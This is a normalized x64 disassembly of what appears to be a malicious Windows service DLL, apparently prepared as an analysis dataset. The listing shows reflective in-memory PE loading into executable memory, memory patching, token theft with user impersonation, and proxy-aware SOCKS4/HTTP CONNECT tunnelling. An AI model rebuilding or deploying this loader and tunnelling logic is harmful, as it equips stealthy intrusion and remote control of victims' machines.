mov [ r11 + 0x18 ] rsi
mov [ r11 - 0x58 ] rax
mov [ r11 - 0x50 ] rax
mov [ r11 - 0x48 ] rax
mov [ r11 - 0x40 ] rax
mov [ r11 - 0x38 ] rax
mov [ r11 + 0x20 ] rdi
mov [ r11 - 0x60 ] 0x0
mov rdi [ rbx + rcx + 0x30 ]
mov esi [ rbx + rcx + 0x50 ]
mov [ r11 - 0x20 ] r15
lea r8d [ rax + 0x30 ]
lea rdx [ r11 - 0x60 ]
mov rcx rdi
mov r15 rdi
call [ VirtualQuery@IAT ]
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
xor edi edi
cmp [ rsp + 0x4c ] 0x1
jne r-xdata
mov rbp [ rsp + 0x98 ]
mov rdi [ rsp + 0xa8 ]
mov rsi [ rsp + 0xa0 ]
mov r15 [ rsp + 0x68 ]
mov r9d 0x40
mov r8d 0x1000
mov rdx rsi
mov rcx rax
call [ VirtualAlloc@IAT ]
lea ecx [ rbp + rbp * 4 ]
lea edx [ rbx + rcx * 8 + 0x108 ]
mov rcx rax
mov rdi rax
movsxd r8 edx
mov rdx r13
call memcpy
test ebp ebp
jle r-xdata
cmp [ rsp + 0x48 ] 0x10000
jne r-xdata
mov ebp [ r14 + r13 + 0x90 ]
mov [ rsp + 0x80 ] r12
mov r12d 0x1
add rbp rdi
add rbp 0x10
cmp [ rbp ] 0x0
je r-xdata
lea rbx [ rbx + r13 + 0x11c ]
mov rsi rbp
nop
nop
nop
cmp [ rsp + 0x40 ] rsi
ja r-xdata
mov r8d [ r14 + r13 + 0xb0 ]
add r8 rdi
cmp [ r8 ] 0x0
je r-xdata
test r12d r12d
je r-xdata
mov edx [ rbx ]
mov ecx [ rbx - 0x8 ]
mov r8d [ rbx - 0x4 ]
add rdx r13
add rcx rdi
call memcpy
add rbx 0x28
sub rsi 0x1
jne r-xdata
mov r9d 0x40
mov r8d 0x2000
mov rdx rsi
mov rcx rdi
mov [ rsp + 0x20 ] rsi
call [ VirtualAlloc@IAT ]
test rax rax
je r-xdata
mov eax [ r14 + r13 + 0x28 ]
xor r8d r8d
mov rcx rdi
lea edx [ r8 + 0x1 ]
add rax rdi
call rax
test eax eax
jne r-xdata
nop
mov rdx [ rsp + 0x20 ]
mov r8d 0x4000
mov rcx rdi
call [ VirtualFree@IAT ]
xor eax eax
mov ecx [ rbp - 0x4 ]
add rcx rdi
cmp [ rcx ] 0x0
je r-xdata
mov rax rdi
jmp r-xdata
add rax 0xfffffffffffffff8
xor edx edx
shr rax 0x1
test eax eax
movsxd r9 eax
jle r-xdata
call [ LoadLibraryA@IAT ]
test rax rax
mov rsi rax
je r-xdata
mov r12 [ rsp + 0x80 ]
mov ecx [ r8 + 0x4 ]
lea rax [ rcx + rcx * 2 ]
prefetcht1 [ r8 + rax * 2 ]
add r8 rcx
cmp [ r8 ] 0x0
jne r-xdata
nop
nop
mov ebx [ rbp ]
add rbx rdi
cmp [ rbx ] 0x0
je r-xdata
mov eax [ r8 + 0x4 ]
test eax eax
je r-xdata
movsxd rax ecx
mov ecx [ r8 ]
add rax rdi
add rcx rax
mov rax rdi
sub rax r15
add [ rcx ] rax
cmp eax 0xa
jne r-xdata
add rbp 0x14
cmp [ rbp ] 0x0
jne r-xdata
nop
nop
movzx ecx [ r8 + rdx * 2 + 0x8 ]
mov eax ecx
and ecx 0xfff
shr eax 0xc
cmp eax 0x3
je r-xdata
add rdx 0x1
cmp rdx r9
jl r-xdata
test r12d r12d
je r-xdata
movzx edx cx
lea rdx [ rcx + rdi + 0x2 ]
jmp r-xdata
mov rcx rsi
call [ FreeLibrary@IAT ]
xor r12d r12d
mov [ rbx ] rax
add rbx 0x8
cmp [ rbx ] 0x0
jne r-xdata
mov rcx rsi
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rbx ]
mov rax 0x8000000000000000
test rax rcx
jne r-xdata
jmp r-xdata
sub_10007570
sub rsp 0x48
mov [ rsp + 0x58 ] rbp
xor ebp ebp
xor r9d r9d
mov [ rsp + 0x30 ] rbp
lea r8d [ rbp + 0x3 ]
mov edx 0x80000000
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x68 ] rdi
mov [ rsp + 0x20 ] 0x3
call [ CreateFileA@IAT ]
cmp rax 0xffffffffffffffff
mov rdi rax
jne r-xdata
xor edx edx
mov rcx rax
mov [ rsp + 0x50 ] rbx
call [ GetFileSize@IAT ]
cmp eax 0x2bc
mov ebx eax
jae r-xdata
xor eax eax
mov rdi [ rsp + 0x68 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x48
retn
xor r9d r9d
xor edx edx
mov rcx rdi
lea r8d [ r9 + 0x2 ]
mov [ rsp + 0x28 ] rbp
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x20 ] ebp
call [ CreateFileMappingA@IAT ]
test rax rax
mov rsi rax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov rbx [ rsp + 0x50 ]
xor eax eax
mov rdi [ rsp + 0x68 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x48
retn
mov rcx rdi
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
xor r9d r9d
xor r8d r8d
mov rcx rax
lea edx [ r9 + 0x4 ]
mov [ rsp + 0x20 ] rbp
call [ MapViewOfFile@IAT ]
test rax rax
mov rbp rax
jne r-xdata
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x50 ]
mov rdi [ rsp + 0x68 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x48
retn
mov edx ebx
mov rcx rax
call sub_10007260
mov rcx rbp
mov rbx rax
call [ UnmapViewOfFile@IAT ]
mov rcx rsi
call [ CloseHandle@IAT ]
mov rcx rdi
call [ CloseHandle@IAT ]
mov rax rbx
mov rcx rsi
call [ CloseHandle@IAT ]
sub_100076a0
sub rsp 0x148
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
test rcx rcx
mov [ rsp + 0x160 ] rbx
mov rbx rcx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
mov r8d 0x104
mov [ rsp + 0x168 ] rdi
call memset
lea rdx [ rsp + 0x20 ]
mov r8d 0x104
mov rcx rbx
call [ GetModuleFileNameA@IAT ]
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
test rax rax
mov rdi rax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
lea rcx [ rsp + 0x20 ]
call sub_10007570
test rax rax
jne r-xdata
mov rbx [ rsp + 0x160 ]
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x148
retn
mov rdi [ rsp + 0x168 ]
sub rax rbx
add rax rdi
ServiceMain
sub rsp 0x48
cmp ecx [ rw-data ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x68 ] rdi
mov edi ecx
mov rbx rdx
jne r-xdata
cmp ecx 0x14
mov [ rsp + 0x60 ] rsi
mov esi 0x1
jne r-xdata
cmp edx 0x1000
jbe r-xdata
lea rcx [ sub_1000c290 ]
xor r8d r8d
xor edx edx
call [ _beginthread@IAT ]
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp edx ecx
cmove eax esi
mov [ rw-data ] eax
mov edx 0x4
lea r9 [ rsp + 0x30 ]
mov rcx rbx
mov r8d edx
call [ VirtualProtect@IAT ]
test eax eax
je r-xdata
mov rsi [ rsp + 0x60 ]
cmp edi 0x14
jae r-xdata
mov rcx [ rw-data ]
call sub_100076a0
test rax rax
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov r8d [ rsp + 0x30 ]
lea r9 [ rsp + 0x30 ]
mov edx 0x4
mov rcx rbx
mov [ rbx ] eax
call [ VirtualProtect@IAT ]
cmp ebx 0x1000
jbe r-xdata
mov rdi [ rsp + 0x68 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x48
retn
mov edx 0x14
mov ecx edx
call rax
mov rdi [ rsp + 0x68 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x48
retn
test rbx rbx
je r-xdata
mov [ rw-data ] esi
mov rcx [ rbx ]
lea rdx [ sub_10007210 ]
call [ RegisterServiceCtrlHandlerW@IAT ]
test rax rax
mov [ rw-data ] rax
je r-xdata
call [ GetLastError@IAT ]
mov ecx eax
jmp r-xdata
xor edx edx
mov r9d esi
xor r8d r8d
lea ecx [ rdx + 0x2 ]
mov [ rsp + 0x20 ] 0x1388
call sub_10007160
test eax eax
je r-xdata
call sub_100071c0
xor r9d r9d
xor r8d r8d
mov edx esi
xor ecx ecx
call [ CreateEventA@IAT ]
test rax rax
mov [ rw-data ] rax
je r-xdata
mov r9d 0x2
xor r8d r8d
xor edx edx
mov ecx r9d
mov [ rsp + 0x20 ] 0x3e8
call sub_10007160
test eax eax
je r-xdata
xor edx edx
mov r9d 0x3
xor r8d r8d
lea ecx [ rdx + 0x2 ]
mov [ rsp + 0x20 ] 0x1388
call sub_10007160
test eax eax
je r-xdata
xor edx edx
xor r9d r9d
xor r8d r8d
lea ecx [ rdx + 0x4 ]
mov [ rsp + 0x20 ] 0x0
call sub_10007160
test eax eax
jne r-xdata
mov rcx [ rw-data ]
mov edx 0xffffffff
call [ WaitForSingleObject@IAT ]
xor ecx ecx
sub_10007950
push rdi
sub rsp 0x360
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x350 ] rax
mov rcx [ rw-data ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x104
call [ GetModuleFileNameA@IAT ]
lea rcx [ rsp + 0x20 ]
call [ _strlwr@IAT ]
lea rcx [ rsp + 0x130 ]
mov edx 0x104
call [ GetWindowsDirectoryA@IAT ]
lea rcx [ rsp + 0x130 ]
call [ _strlwr@IAT ]
xor eax eax
lea rdi [ rsp + 0x130 ]
mov rcx 0xffffffffffffffff
lea rdx [ rsp + 0x130 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x20 ]
call [ strncmp@IAT ]
test eax eax
je r-xdata
call sub_10007ae0
lea rcx [ rw-data ]
call sub_10006bc0
cmp [ rw-data ] 0x0
je r-xdata
lea rcx [ rsp + 0x244 ]
xor edx edx
mov r8d 0x100
mov [ rsp + 0x240 ] 0x5c2e2e
call memset
lea rcx [ rsp + 0x20 ]
mov edx 0x5c
call [ strrchr@IAT ]
lea rdi [ rsp + 0x240 ]
mov rcx 0xffffffffffffffff
mov r11 rax
xor eax eax
[ rdi ]
xor edx edx
nop
nop
lea rcx [ rsp + 0x20 ]
call [ LoadLibraryA@IAT ]
test rax rax
je r-xdata
lea rcx [ rw-data ]
call sub_10006d40
movzx ecx [ r11 + rdx + 0x1 ]
add rdx 0x1
test cl cl
mov [ rdi + rdx - 0x2 ] cl
jne r-xdata
lea rcx [ rsp + 0x240 ]
call sub_10006bc0
xor eax eax
mov rcx [ rsp + 0x350 ]
xor rcx rsp
call sub_10010a60
add rsp 0x360
pop rdi
retn
call sub_1000ff60
xor edx edx
xor ecx ecx
call ServiceMain
sub_10007af0
mov r11 rsp
sub rsp 0x168
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x150 ] rax
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rsi
mov rsi rcx
xor ebx ebx
xor edx edx
mov [ r11 + 0x20 ] rdi
lea ecx [ rbx + 0x2 ]
call [ rw-data ]
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x12c
mov rdi rax
call memset
lea rdx [ rsp + 0x20 ]
mov rcx rdi
mov [ rsp + 0x20 ] 0x130
call [ rw-data ]
test eax eax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov rdi [ rsp + 0x188 ]
mov rsi [ rsp + 0x180 ]
mov eax ebx
mov rbx [ rsp + 0x178 ]
mov rcx [ rsp + 0x150 ]
xor rcx rsp
call sub_10010a60
add rsp 0x168
retn
cmp [ rsp + 0x28 ] 0x0
je r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call [ rw-data ]
test eax eax
jne r-xdata
lea rdx [ rsp + 0x4c ]
mov rcx rsi
call [ _stricmp@IAT ]
test eax eax
cmove ebx [ rsp + 0x28 ]
sub_10007bc0
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x20
pop rbx
retn
lea rcx [ r--data ]
call sub_10007af0
test eax eax
je r-xdata
mov r8d eax
xor edx edx
mov ecx 0x400
call [ OpenProcess@IAT ]
test rax rax
mov rbx rax
je r-xdata
lea r8 [ rw-data ]
mov edx 0xf01ff
mov rcx rax
call [ OpenProcessToken@IAT ]
mov rcx rbx
call [ CloseHandle@IAT ]
sub_10007c20
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
call sub_10007bc0
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
add rsp 0x28
jmp [ ImpersonateLoggedOnUser@IAT ]
sub_10007c80
mov rax rsp
sub rsp 0x248
mov [ rax + 0x8 ] 0x14
mov [ rax + 0xc ] 0x0
lea rax [ rax + 0x8 ]
mov [ rsp + 0x38 ] rcx
lea r8 [ rsp + 0x30 ]
xor r9d r9d
add ecx 0x1
xor edx edx
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] 0x1
call [ rw-data ]
add rsp 0x248
retn
sub_10007cd0
mov rax rsp
sub rsp 0x248
mov [ rax + 0x8 ] 0x14
mov [ rax + 0xc ] 0x0
lea rax [ rax + 0x8 ]
mov [ rsp + 0x38 ] rcx
lea rdx [ rsp + 0x30 ]
xor r9d r9d
add ecx 0x1
xor r8d r8d
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] 0x1
call [ rw-data ]
add rsp 0x248
retn
sub_10007d80
xor r11d r11d
lea r9 [ rcx + 0x4 ]
mov edx r11d
mov r10 r11
mov r8 r11
add edx 0x1
add r8 0x8
add r9 0x8
cmp edx 0x8
jl r-xdata
mov r11d edx
mov r10 r8
mov eax [ r10 + rcx + 0x4 ]
cmp [ r9 ] eax
jle r-xdata
mov eax r11d
retn
sub_10007dc0
mov rax rsp
sub rsp 0x68
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
xor edi edi
mov rbx rdi
call sub_10007d80
add rbx 0x1
cmp rbx 0x8
movsxd rdx eax
mov rax [ rcx + rdx * 8 ]
mov [ rcx + rdx * 8 + 0x4 ] edi
mov [ rsp + rbx * 8 + 0x18 ] rax
jl r-xdata
lea rdx [ rsp + 0x20 ]
mov r8d 0x40
call memcpy
mov rdi [ rsp + 0x88 ]
mov rbx [ rsp + 0x80 ]
add rsp 0x68
retn
sub_10007e20
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x78
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x60 ] rdi
mov [ rcx ] 0x0
mov [ rsp + 0x58 ] r12
mov ecx 0x1000
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x48 ] r14
mov rsi r8
call ??2@YAPEAX_K@Z
xor edx edx
mov r8d 0x1000
mov rcx rax
mov r12 rax
mov [ rsp + 0x30 ] rax
call memset
mov [ rsp + 0x98 ] rbx
xor r14d r14d
xor r13d r13d
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r13
lea rdx [ rw-data ]
mov [ rsp + 0x40 ] r15
add r13 0x1
cmp r13 0x8
mov [ rsp + 0x28 ] r13
jl r-xdata
call [ rw-data ]
test rax rax
mov rbp rax
je r-xdata
movsxd r15 [ rsi + r13 * 8 ]
mov rcx r15
shl rcx 0x6
add rcx rdx
cmp [ rcx ] 0x0
je r-xdata
test r14d r14d
mov r15 [ rsp + 0x40 ]
mov r13 [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rbp [ rsp + 0x70 ]
mov rbx [ rsp + 0x98 ]
jne r-xdata
lea rdx [ rw-data ]
jmp r-xdata
mov rcx [ rax + 0x18 ]
mov rdx [ rcx ]
test rdx rdx
je r-xdata
mov rcx [ rsp + 0x80 ]
mov rax [ rsp + 0x30 ]
mov [ rcx ] r14d
mov r14 [ rsp + 0x48 ]
add rsp 0x78
retn
mov rcx [ rsp + 0x30 ]
call ??3@YAXPEAX@Z
mov rcx [ rsp + 0x80 ]
xor eax eax
mov [ rcx ] r14d
mov r14 [ rsp + 0x48 ]
add rsp 0x78
retn
lea rdx [ rw-data ]
xor ebx ebx
nop
nop
mov rax [ rbp + 0x18 ]
add rbx 0x8
mov rdx [ rbx + rax ]
test rdx rdx
jne r-xdata
lea rdi [ r--data ]
mov rsi rax
mov ecx 0x8
[ rsi ] [ rdi ]
je r-xdata
mov ecx [ rdx ]
call [ rw-data ]
test rax rax
mov r11 rax
je r-xdata
mov r13 [ rsp + 0x28 ]
mov rsi [ rsp + 0x90 ]
lea rdx [ rw-data ]
jmp r-xdata
lea rdi [ r--data ]
mov rsi rax
mov ecx 0xa
[ rsi ] [ rdi ]
je r-xdata
mov rsi [ rsp + 0x20 ]
lea rax [ rw-data ]
mov rdx r12
movzx ecx [ rax + r15 * 2 ]
mov eax r15d
add rsi 0x1
shl eax 0x10
add r14d 0x1
mov [ rsp + 0x20 ] rsi
or ecx eax
mov rax [ rsp + 0x88 ]
sub rdx r11
mov [ rax + rsi * 4 - 0x4 ] ecx
mov rcx r11
nop
nop
nop
movzx eax [ rcx ]
add rcx 0x1
test al al
mov [ rdx + rcx - 0x1 ] al
jne r-xdata
xor eax eax
mov rcx 0xffffffffffffffff
mov rdi r11
[ rdi ]
not rcx
add r12 rcx
sub_10008040
mov r11 rsp
sub rsp 0xb8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
xor eax eax
mov [ rsp + 0x38 ] 0x0
lea rcx [ r11 - 0x80 ]
mov [ r11 - 0x7f ] rax
mov [ r11 - 0x77 ] rax
mov [ r11 - 0x6f ] rax
mov [ r11 - 0x67 ] rax
lea edx [ rax + 0x1 ]
mov [ r11 + 0x18 ] rbx
mov [ rsp + 0x59 ] eax
mov [ rsp + 0x5d ] ax
mov [ rsp + 0x5f ] al
call [ InitializeSecurityDescriptor@IAT ]
xor r9d r9d
lea rcx [ rsp + 0x38 ]
lea edx [ r9 + 0x1 ]
xor r8d r8d
call [ SetSecurityDescriptorDacl@IAT ]
xor r11d r11d
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x28 ] r11
lea r8 [ rw-data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] r11
mov [ rsp + 0x20 ] 0x18
call [ sprintf@IAT ]
lea r9 [ rsp + 0x60 ]
lea rcx [ rsp + 0x20 ]
xor r8d r8d
xor edx edx
call [ CreateEventA@IAT ]
test rax rax
mov rbx rax
je r-xdata
mov rbx [ rsp + 0xd0 ]
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_10010a60
add rsp 0xb8
retn
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov rcx rbx
call [ ResetEvent@IAT ]
mov rax rbx
jmp r-xdata
mov rcx rbx
mov [ rsp + 0xd8 ] rdi
call [ CloseHandle@IAT ]
mov ecx 0x32
call [ Sleep@IAT ]
lea r9 [ rsp + 0x60 ]
lea rcx [ rsp + 0x20 ]
xor r8d r8d
xor edx edx
call [ CreateEventA@IAT ]
test rax rax
mov rdi rax
je r-xdata
mov rdi [ rsp + 0xd8 ]
nop
nop
xor eax eax
jmp r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
mov ecx 0x32
call [ Sleep@IAT ]
lea r9 [ rsp + 0x60 ]
lea rcx [ rsp + 0x20 ]
xor r8d r8d
xor edx edx
call [ CreateEventA@IAT ]
test rax rax
mov rdi rax
jne r-xdata
call [ GetLastError@IAT ]
mov rcx rdi
mov ebx eax
call [ CloseHandle@IAT ]
cmp ebx 0xb7
jne r-xdata
sub_10008590
mov r11 rsp
sub rsp 0x308
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2d0 ] rax
mov [ r11 - 0x8 ] rbx
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] rdi
mov rbp r8
xor r8d r8d
mov ebx edx
lea edx [ r8 + 0x1 ]
mov rdi rcx
mov [ r11 - 0x28 ] r12
lea ecx [ rdx + 0x1 ]
mov r12d r9d
call [ rw-data ]
movzx ecx bx
mov rsi rax
xor eax eax
mov [ rsp + 0x250 ] eax
mov [ rsp + 0x250 ] 0x2
mov [ rsp + 0x254 ] eax
mov [ rsp + 0x258 ] eax
mov [ rsp + 0x25c ] eax
call [ rw-data ]
mov rcx rdi
mov [ rsp + 0x252 ] ax
call [ rw-data ]
lea rdx [ rsp + 0x250 ]
mov r8d 0x10
mov rcx rsi
mov [ rsp + 0x254 ] eax
call [ rw-data ]
mov rdi [ rsp + 0x2e8 ]
mov rbx [ rsp + 0x300 ]
test eax eax
js r-xdata
mov rcx rsi
call [ rw-data ]
xor eax eax
xor edx edx
lea rcx [ rsp + 0x260 ]
lea r8d [ rdx + 0x64 ]
call memset
movzx ecx r12w
mov [ rsp + 0x260 ] 0x4
mov [ rsp + 0x261 ] 0x1
call [ rw-data ]
mov rcx rbp
mov [ rsp + 0x262 ] ax
call [ rw-data ]
xor r9d r9d
lea rdx [ rsp + 0x260 ]
lea r8d [ r9 + 0x9 ]
mov rcx rsi
mov [ rsp + 0x264 ] eax
call [ rw-data ]
test eax eax
jle r-xdata
lea rax [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x30 ] 0x14
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x34 ] 0x0
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] 0x1
call [ rw-data ]
test eax eax
jle r-xdata
xor edx edx
lea rcx [ rsp + 0x260 ]
lea r8d [ rdx + 0x64 ]
call memset
xor r9d r9d
lea rdx [ rsp + 0x260 ]
lea r8d [ r9 + 0x64 ]
mov rcx rsi
call [ rw-data ]
test eax eax
jle r-xdata
cmp [ rsp + 0x260 ] 0x0
jne r-xdata
cmp [ rsp + 0x261 ] 0x5a
jne r-xdata
mov rax rsi
jmp r-xdata
mov r12 [ rsp + 0x2e0 ]
mov rsi [ rsp + 0x2f0 ]
mov rbp [ rsp + 0x2f8 ]
mov rcx [ rsp + 0x2d0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x308
retn
sub_10008780
mov r11 rsp
sub rsp 0x4f8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x4c0 ] rax
mov [ r11 - 0x8 ] rbx
mov [ r11 - 0x10 ] rbp
mov [ r11 - 0x18 ] rsi
mov [ r11 - 0x20 ] rdi
mov rbp r8
xor r8d r8d
mov edi edx
lea edx [ r8 + 0x1 ]
mov rbx rcx
mov [ r11 - 0x28 ] r12
lea ecx [ rdx + 0x1 ]
mov r12d r9d
call [ rw-data ]
movzx ecx di
mov rsi rax
xor eax eax
mov [ rsp + 0x250 ] eax
mov [ rsp + 0x250 ] 0x2
mov [ rsp + 0x254 ] eax
mov [ rsp + 0x258 ] eax
mov [ rsp + 0x25c ] eax
call [ rw-data ]
mov rcx rbx
mov [ rsp + 0x252 ] ax
call [ rw-data ]
lea rdx [ rsp + 0x250 ]
mov r8d 0x10
mov rcx rsi
mov [ rsp + 0x254 ] eax
call [ rw-data ]
mov rbx [ rsp + 0x4f0 ]
test eax eax
jns r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x260 ]
movzx r9d r12w
mov r8 rbp
call [ sprintf@IAT ]
xor eax eax
lea rdi [ rsp + 0x260 ]
mov rcx 0xffffffffffffffff
lea rdx [ rsp + 0x260 ]
xor r9d r9d
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rsi
call [ rw-data ]
test eax eax
jle r-xdata
mov rcx rsi
call [ rw-data ]
xor eax eax
jmp r-xdata
lea rax [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x30 ] 0x14
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x34 ] 0x0
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x40 ] 0x1
call [ rw-data ]
test eax eax
jle r-xdata
mov r12 [ rsp + 0x4d0 ]
mov rdi [ rsp + 0x4d8 ]
mov rsi [ rsp + 0x4e0 ]
mov rbp [ rsp + 0x4e8 ]
mov rcx [ rsp + 0x4c0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x4f8
retn
lea rcx [ rsp + 0x260 ]
xor edx edx
mov r8d 0x258
call memset
lea rdx [ rsp + 0x260 ]
xor r9d r9d
mov r8d 0x258
mov rcx rsi
call [ rw-data ]
test eax eax
jle r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x260 ]
call [ strstr@IAT ]
test rax rax
je r-xdata
mov rax rsi
sub_10008970
mov r11 rsp
sub rsp 0x2d8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2c0 ] rax
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rsi
mov rsi rcx
mov rbx 0xffffffff80000001
call sub_10007c20
test eax eax
je r-xdata
lea r8 [ rsp + 0x38 ]
lea rdx [ r--data ]
mov rcx rbx
mov [ rsp + 0x38 ] 0x0
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x40
call [ GetUserNameA@IAT ]
xor r11d r11d
lea rax [ rsp + 0x80 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] r11
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x60 ] r11
mov [ rsp + 0x68 ] r11
mov [ rsp + 0x70 ] r11
mov [ rsp + 0x78 ] r11
mov [ rsp + 0x48 ] 0x38
mov [ rsp + 0x4c ] 0x1
call [ RevertToSelf@IAT ]
mov rax [ rw-data ]
test rax rax
jne r-xdata
mov rsi [ rsp + 0x2f0 ]
mov rbx [ rsp + 0x2e8 ]
mov rcx [ rsp + 0x2c0 ]
xor rcx rsp
call sub_10010a60
add rsp 0x2d8
retn
lea rcx [ rsp + 0xc1 ]
xor edx edx
mov r8d 0x1ff
mov [ rsp + 0xc0 ] al
call memset
mov rcx [ rsp + 0x38 ]
lea rax [ rsp + 0x30 ]
lea r9 [ rsp + 0x40 ]
lea rdx [ r--data ]
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xc0 ]
xor r8d r8d
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x30 ] 0x200
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rw-data ]
lea rdx [ rsp + 0x48 ]
call rax
test eax eax
cmovne rbx [ rsp + 0x78 ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
mov [ rw-data ] rax
je r-xdata
mov rcx [ rsp + 0x38 ]
call [ RegCloseKey@IAT ]
lea rdx [ r--data ]
lea rcx [ rsp + 0xc0 ]
mov [ rsp + 0x2f8 ] rdi
call [ strstr@IAT ]
test rax rax
mov rbx rax
je r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0xc0 ]
call [ strstr@IAT ]
test rax rax
mov rbx rax
je r-xdata
add rbx 0x5
mov edx 0x3a
mov rcx rbx
call [ strchr@IAT ]
test rax rax
mov rdi rax
je r-xdata
mov rdi [ rsp + 0x2f8 ]
add rbx 0x6
mov edx 0x3a
mov rcx rbx
call [ strchr@IAT ]
test rax rax
mov rdi rax
je r-xdata
cmp rax rbx
je r-xdata
cmp rax rbx
je r-xdata
lea rcx [ rax + 0x1 ]
call [ atoi@IAT ]
test eax eax
mov [ rsi + 0x44 ] eax
js r-xdata
lea rcx [ rax + 0x1 ]
call [ atoi@IAT ]
test eax eax
mov [ rsi + 0x20 ] eax
js r-xdata
mov [ rsi + 0x44 ] 0x0
sub rdi rbx
lea rcx [ rsi + 0x24 ]
mov rdx rbx
mov r8 rdi
call [ strncpy@IAT ]
jmp r-xdata
mov [ rsi + 0x20 ] 0x0
sub rdi rbx
mov rdx rbx
mov rcx rsi
mov r8 rdi
call [ strncpy@IAT ]
jmp r-xdata
sub_10008c00
push rdi
sub rsp 0x140
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x130 ] rax
mov rax [ rw-data ]
test rax rax
jne r-xdata
call rax
lea rcx [ rsp + 0x20 ]
mov edx 0x104
call [ GetSystemDirectoryA@IAT ]
xor eax eax
lea rdi [ rsp + 0x20 ]
mov rcx 0xffffffffffffffff
[ rdi ]
movzx ecx [ r--data ]
mov rax [ r--data ]
mov [ rdi - 0x1 ] rax
mov [ rdi + 0x7 ] cx
movzx ecx [ r--data ]
mov [ rdi + 0x9 ] cl
lea rcx [ rsp + 0x20 ]
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
mov [ rw-data ] rax
je r-xdata
mov rcx [ rsp + 0x130 ]
xor rcx rsp
call sub_10010a60
add rsp 0x140
pop rdi
retn
sub_10008cb0
mov [ rsp + 0x10 ] edx
push rbx
sub rsp 0x30
mov rbx rcx
lea r8 [ rsp + 0x58 ]
